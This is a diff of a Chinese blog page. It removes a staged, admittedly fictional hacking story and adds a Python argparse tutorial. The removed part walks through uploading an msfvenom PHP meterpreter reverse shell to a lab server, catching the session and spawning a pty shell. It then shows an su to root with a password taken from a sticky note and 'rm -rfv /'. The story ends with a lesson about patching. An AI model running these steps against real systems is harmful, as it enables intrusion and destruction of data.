-</div><p>他惊讶地发现内核版本居然才 <code>2.6.32</code>，这样的事他还是第一次见。</p>
-<p>除此之外，开放的端口有 SSH 、 HTTP ，这给了他很好的机会。</p>
-<p>他试图访问了网站，在网站上发现了一个文件上传点。</p>
-<p><img src="/img/2020-09-26_21-18.png" alt=""></p>
-<p>抱着试试看的态度，用 msf 生成了一个 payload</p>
+</div><p>好的不难看出，我们得到的东西会到这个 <code>args</code> 变量里面去，<strong>因为它是由 <code>parser.parse_args()</code> 这个函数所返回的内容所赋值而来的，而取出对应选项参数得到的内容则是 <code>args.选项名</code></strong></p>
+<p>比如我们要获取写出的文件名</p>
 <div class="highlight"><div style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
 <table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
 <pre style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
 </span></code></pre></td>
 <td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ msfvenom -p php/meterpreter/reverse_tcp <span style="color:#bb60d5">LHOST</span><span style="color:#666">=</span>192.168.0.109 <span style="color:#bb60d5">LPORT</span><span style="color:#666">=</span><span style="color:#40a070">4444</span> -o shell.php
-</code></pre></td></tr></table>
-</div>
-</div><p>选择了文件，点击上传惊奇地发现，不止上传成功，还被告知了位置
-<img src="/img/2020-09-26_21-22.png" alt="">
-于是他启动了 <code>msfconsole</code></p>
-<div class="highlight"><div style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
-<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
-</span></code></pre></td>
-<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ msfconsole
-</code></pre></td></tr></table>
-</div>
-</div><p>并使用  <code>exploit/multi/handler</code> 这个模块</p>
-<div class="highlight"><div style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
-<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
-</span></code></pre></td>
-<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">msf5 &gt; use exploit/multi/handler 
-</code></pre></td></tr></table>
-</div>
-</div><p>依次设置好参数</p>
-<div class="highlight"><div style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
-<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
-</span></code></pre></td>
-<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">msf5 exploit(multi/handler) &gt; set LHOST 192.168.0.109
+<pre style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">$ vim b.py
 </code></pre></td></tr></table>
 </div>
 </div><div class="highlight"><div style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
-<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
-</span></code></pre></td>
-<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">msf5 exploit(multi/handler) &gt; set LPORT 4444
-</code></pre></td></tr></table>
-</div>
-</div><div class="highlight"><div style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
-<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
-</span></code></pre></td>
-<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">set payload php/meterpreter/reverse_tcp
-</code></pre></td></tr></table>
-</div>
-</div><p>最后一步就是运行模块了，</p>
-<div class="highlight"><div style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
-<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
-</span></code></pre></td>
-<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">msf5 exploit(multi/handler) &gt; run
-</code></pre></td></tr></table>
-</div>
-</div><p>然后 msf 开始监听。</p>
-<div class="highlight"><div style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
-<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
-</span></code></pre></td>
-<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">
-[*] Started reverse TCP handler on 192.168.0.109:4444 
-
-</code></pre></td></tr></table>
-</div>
-</div><p>这时他将提示出的文件地址和链接改一下，并访问</p>
-<blockquote>
-<p><code>http://192.168.0.116/upload/shell.php</code></p>
-</blockquote>
-<p>msf 立刻就有了结果，可想而知，服务器的安全措施有多差</p>
-<div class="highlight"><div style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
-<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
-</span></code></pre></td>
-<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">[*] Started reverse TCP handler on 192.168.0.109:4444 
-[*] Sending stage (38288 bytes) to 192.168.0.116
-[*] Meterpreter session 1 opened (192.168.0.109:4444 -&gt; 192.168.0.116:52350) at 2020-09-26 21:33:06 +0800
-
-meterpreter &gt; 
-</code></pre></td></tr></table>
-</div>
-</div><p>现在他开始获取系统简要信息</p>
-<ul>
-<li>系统、内核版本</li>
-</ul>
-<div class="highlight"><div style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
 <table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
 <pre style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
 </span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
@@ -814,138 +831,54 @@ meterpreter &gt;
 </span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
 </span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
 </span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">7
 </span></code></pre></td>
 <td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">meterpreter &gt; sysinfo
-Computer    : localhost
-OS          : Linux localhost 2.6.32-754.33.1.el6.x86_64 #1 SMP Tue Aug 25 15:29:40 UTC 2020 x86_64
-Meterpreter : php/linux
-meterpreter &gt; cat /etc/issue
-CentOS release 6.10 (Final)
-Kernel \r on an \m
+<pre style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#007020;font-weight:bold">import</span> <span style="color:#0e84b5;font-weight:bold">argparse</span>
+parser <span style="color:#666">=</span> argparse<span style="color:#666">.</span>ArgumentParser(description<span style="color:#666">=</span><span style="color:#4070a0">&#39;Help&#39;</span>, epilog<span style="color:#666">=</span><span style="color:#4070a0">&#39;A new testing program.&#39;</span>)
+parser<span style="color:#666">.</span>add_argument(<span style="color:#4070a0">&#39;-o&#39;</span>,<span style="color:#4070a0">&#39;--output&#39;</span>, help<span style="color:#666">=</span><span style="color:#4070a0">&#39;Output file&#39;</span>,default<span style="color:#666">=</span><span style="color:#4070a0">&#39;test.txt&#39;</span> , required<span style="color:#666">=</span>True)
+args <span style="color:#666">=</span> parser<span style="color:#666">.</span>parse_args()
+filename <span style="color:#666">=</span> args<span style="color:#666">.</span>output
+<span style="color:#007020;font-weight:bold">print</span>(<span style="color:#4070a0">&#34;The filename is &#34;</span><span style="color:#666">+</span> filename)
 </code></pre></td></tr></table>
 </div>
-</div><ul>
-<li>当前控制的用户权限</li>
-</ul>
-<div class="highlight"><div style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
+</div><div class="highlight"><div style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
 <table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
 <pre style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
 </span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
 </span></code></pre></td>
 <td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">meterpreter &gt; getuid
-Server username: apache (48)
+<pre style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">$ python b.py -o WeepingDogel
+The filename is WeepingDogel
 </code></pre></td></tr></table>
 </div>
-</div><p>权限还是很低的，尽管无法做一些让公司损失大的事情，但至少能够偷窥和搞破坏了，不过黑客会就此满足吗？ 答案是不会，因为他还想要提权，获取 root 权限，这样便能为所欲为了。</p>
-<p>由于这台服务器的系统与内核过于老旧，大多数复现漏洞的代码要么只在3.x 以上的内核版本中有效，要么无法编译。</p>
-<p>看起来他需要想想其他办法。</p>
-<p>他在白天骑着摩托穿街过巷送外卖，夜晚则是游走网络间的黑客。</p>
-<p>一次偶然的机会，他去送那个公司的员工订的外卖，进入办公区时，无意之间看到贴在显示器上的便签。</p>
-<p>上面写着一些数字和字母，也许是什么有用的东西。</p>
-<p>趁着员工们用餐，他用手机偷偷将便签拍了下来便离开了。</p>
-<p>比较巧的是，这张便签是刚换的密码，需要再隔一段时间才会更改。</p>
-<p>下班后回到终端，尝试着用偷窥来的密码直接登陆 root</p>
-<div class="highlight"><div style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
-<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
-</span></code></pre></td>
-<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">meterpreter &gt; shell
-Process 1376 created.
-Channel 2 created.
-</code></pre></td></tr></table>
-</div>
-</div><p>获得交互 shell</p>
-<div class="highlight"><div style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
-<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
-</span></code></pre></td>
-<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">/bin/sh -i
-sh: no job control in this shell
-sh-4.1$ python -c &#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39;
-python -c &#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39;
-bash-4.1$ 
-</code></pre></td></tr></table>
-</div>
-</div><p>进行登录</p>
-<div class="highlight"><div style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
-<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
-</span></code></pre></td>
-<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">bash-4.1$ su root
-su root
-Password: ************
-
-[root@localhost upload]# 
-</code></pre></td></tr></table>
-</div>
-</div><p>可见，一口气便登录成功，root 权限到了他的手里。</p>
-<div class="highlight"><div style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
-<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">7
-</span></code></pre></td>
-<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">[root@localhost upload]# whoami
-whoami
-root
-[root@localhost upload]# id
-id
-uid=0(root) gid=0(root) groups=0(root) context=unconfined_u:system_r:httpd_t:s0
-[root@localhost upload]# 
-</code></pre></td></tr></table>
-</div>
-</div><p>接下来他便可以为所欲为了..</p>
-<p>对，他最后进行了删库</p>
+</div><p>可见我们已经获取到这个字符串 &ldquo;WeepingDogel&rdquo; 了。</p>
+<p>同理，需要读取的文件名也是一样的</p>
 <div class="highlight"><div style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
 <table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
 <pre style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
 </span></code></pre></td>
 <td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">[root@localhost upload]# rm -rfv /
+<pre style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">args<span style="color:#666">.</span>read
 </code></pre></td></tr></table>
 </div>
-</div><p>最后导致公司损失巨大..</p>
+</div><p>这么写就可以了～</p>
+<p>接下来用截图来看看上面那一堆代码的效果：
+<img src="/img/2021-05-16-20-05-47%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt=""></p>
+<p>简单的创建与使用就是如此&hellip;</p>
+<p>当然还有更多的用法需要探索..</p>
 <h1 id="结语">结语</h1>
-<p>虽然以上的故事纯属虚构，攻击也只是在模拟环境进行的。</p>
-<p>但却值得我们思考，就我们能看到的来看&hellip;</p>
+<p>那么我接下来要做的就是将这些更新进 <a href="https://github.com/WeepingDogel/TitleGetter">TitleGetter</a> 啦！</p>
+<p>以后就不需要在配置文件里设置 <code>list.txt</code> 的位置了！ 输出的文件位置也不需要固定了！！</p>
+<hr>
+<h1 id="参考链接">参考链接</h1>
 <ul>
-<li>系统不更新容易被攻击</li>
-<li>代码不更新容易出漏洞</li>
-<li>密码更新太慢容易泄露</li>
-<li>漏洞以更新来修复，不修则被利用</li>
+<li><a href="https://vra.github.io/2017/12/02/argparse-usage/">argparse简要用法总结 | Yunfeng&rsquo;s Simple Blog</a></li>
+<li><a href="https://docs.python.org/3/library/argparse.html">argparse â Parser for command-line options, arguments and sub-commands — Python 3.9.5 documentation</a></li>
 </ul>
-<p>而我们看不到的&hellip;</p>
-<p>软件终究是人所创造的，人尚无完美者，需要不断反省自己，思考自己，何况是所造之物？</p>
-<p>不论作为用户开始开发者，更新自己应该更新的东西是再正常不过的事情了，只不过有快慢之别，但不论快慢，总得前进，迟早都要往前走的。</p>
-<p>而不能站立不动甚至往回走。</p>
-<p>物之更新如人之反省，人不知反省，前途渺茫，物不被更新，受人遗弃。</p>
-<p>甚至是，像看到我刚刚讲的笑话那样，被一个送外卖的脚本小子轻松破坏掉了..</p>
-<p>以上，只是个人想法，若有不当之处，请在下面的 gitalk 评论插件中 <del>喷我</del> 纠正。</p>
 
                     
                     <HR width="100%" id="EOF">
-		    <p style="color:#777;">最后修改于 2020-09-26</p>
+		    <p style="color:#777;">最后修改于 2021-05-16</p>
                     
                 </div>
             </div>
@@ -954,14 +887,14 @@ uid=0(root) gid=0(root) groups=0(root) context=unconfined_u:system_r:httpd_t:s0
             <nav class="post-pagination">
 
                 
-                <a class="newer-posts" href="https://weepingdogel.github.io/posts/%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8github%E6%90%AD%E5%BB%BA%E7%BD%91%E7%AB%99_%E4%B8%8B/">
-			下回<br>如何使用 GitHub 搭建博客
+                <a class="newer-posts">
+			下回<br>已经到头啦。
                 </a>
                 
                 
                 
-                <a class="older-posts" href="https://weepingdogel.github.io/posts/python%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C/">
-			上回<br>Python 学习笔记——文件操作
+                <a class="older-posts" href="https://weepingdogel.github.io/posts/%E5%B0%9D%E8%AF%95%E5%9C%A8linux%E4%B8%8B%E7%BC%96%E8%AF%91exe%E5%8F%AF%E6%89%A7%E8%A1%8C%E6%96%87%E4%BB%B6/">
+			上回<br>尝试在 Linux 下编译 exe 可执行文件
                 </a>
                 
             </nav>
